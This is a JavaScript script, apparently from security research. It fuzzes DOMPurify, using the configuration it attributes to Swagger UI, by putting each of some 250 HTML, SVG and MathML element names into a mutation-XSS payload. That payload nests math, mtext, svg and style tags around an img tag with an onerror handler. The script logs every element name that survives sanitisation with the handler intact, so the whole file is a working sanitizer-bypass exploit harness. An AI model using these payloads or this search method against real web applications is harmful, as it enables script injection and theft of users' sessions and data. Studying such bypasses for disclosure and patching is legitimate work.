const allElements = [
                'a',
                'abbr',
                'acronym',
                'address',
                'area',
                'article',
                'aside',
                'audio',
                'b',
                'bdi',
                'bdo',
                'big',
                'blink',
                'blockquote',
                'body',
                'br',
                'button',
                'canvas',
                'caption',
                'center',
                'cite',
                'code',
                'col',
                'colgroup',
                'content',
                'data',
                'datalist',
                'dd',
                'decorator',
                'del',
                'details',
                'dfn',
                'dialog',
                'dir',
                'div',
                'dl',
                'dt',
                'element',
                'em',
                'fieldset',
                'figcaption',
                'figure',
                'font',
                'footer',
                'form',
                'h1',
                'h2',
                'h3',
                'h4',
                'h5',
                'h6',
                'head',
                'header',
                'hgroup',
                'hr',
                'html',
                'i',
                'img',
                'input',
                'ins',
                'kbd',
                'label',
                'legend',
                'li',
                'main',
                'map',
                'mark',
                'marquee',
                'menu',
                'menuitem',
                'meter',
                'nav',
                'nobr',
                'ol',
                'optgroup',
                'option',
                'output',
                'p',
                'picture',
                'pre',
                'progress',
                'q',
                'rp',
                'rt',
                'ruby',
                's',
                'samp',
                'section',
                'select',
                'shadow',
                'small',
                'source',
                'spacer',
                'span',
                'strike',
                'strong',
                'style',
                'sub',
                'summary',
                'sup',
                'table',
                'tbody',
                'td',
                'template',
                'textarea',
                'tfoot',
                'th',
                'thead',
                'time',
                'tr',
                'track',
                'tt',
                'u',
                'ul',
                'var',
                'video',
                'wbr',
                'svg',
                'a',
                'altglyph',
                'altglyphdef',
                'altglyphitem',
                'animatecolor',
                'animatemotion',
                'animatetransform',
                'circle',
                'clippath',
                'defs',
                'desc',
                'ellipse',
                'filter',
                'font',
                'g',
                'glyph',
                'glyphref',
                'hkern',
                'image',
                'line',
                'lineargradient',
                'marker',
                'mask',
                'metadata',
                'mpath',
                'path',
                'pattern',
                'polygon',
                'polyline',
                'radialgradient',
                'rect',
                'stop',
                'style',
                'switch',
                'symbol',
                'text',
                'textpath',
                'title',
                'tref',
                'tspan',
                'view',
                'vkern',
                'feBlend',
                'feColorMatrix',
                'feComponentTransfer',
                'feComposite',
                'feConvolveMatrix',
                'feDiffuseLighting',
                'feDisplacementMap',
                'feDistantLight',
                'feFlood',
                'feFuncA',
                'feFuncB',
                'feFuncG',
                'feFuncR',
                'feGaussianBlur',
                'feImage',
                'feMerge',
                'feMergeNode',
                'feMorphology',
                'feOffset',
                'fePointLight',
                'feSpecularLighting',
                'feSpotLight',
                'feTile',
                'feTurbulence',
                'animate',
                'color-profile',
                'cursor',
                'discard',
                'fedropshadow',
                'font-face',
                'font-face-format',
                'font-face-name',
                'font-face-src',
                'font-face-uri',
                'foreignobject',
                'hatch',
                'hatchpath',
                'mesh',
                'meshgradient',
                'meshpatch',
                'meshrow',
                'missing-glyph',
                'script',
                'set',
                'solidcolor',
                'unknown',
                'use',
                'math',
                'menclose',
                'merror',
                'mfenced',
                'mfrac',
                'mglyph',
                'mi',
                'mlabeledtr',
                'mmultiscripts',
                'mn',
                'mo',
                'mover',
                'mpadded',
                'mphantom',
                'mroot',
                'mrow',
                'ms',
                'mspace',
                'msqrt',
                'mstyle',
                'msub',
                'msup',
                'msubsup',
                'mtable',
                'mtd',
                'mtext',
                'mtr',
                'munder',
                'munderover',
                'maction',
                'maligngroup',
                'malignmark',
                'mlongdiv',
                'mscarries',
                'mscarry',
                'msgroup',
                'mstack',
                'msline',
                'msrow',
                'semantics',
                'annotation',
                'annotation-xml',
                'mprescripts',
                'none',
];

// payload that we are testing
const payload = `<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">`;

const domParser = new DOMParser();

// iterate on each HTML element
allElements.forEach(element => {
    let newPayload = payload.replace("<style>", `<${element}>`).replace("</style>", `</${element}>`);

    // DOMPurify with the same config as in Swagger UI (and the same version)
    const sanitized = DOMPurify.sanitize(newPayload, {
        ADD_ATTR: ["target"],
        FORBID_TAGS: ["style"]
    });

    const parsedDOM = domParser.parseFromString(sanitized, 'text/html');

    parsedDOM.querySelectorAll(`img`).forEach(img => {
        // only bypass will have onerror handler
        if(img.attributes["onerror"]) {
            console.log(`Found bypass: ${element}`);
        }
    });
});
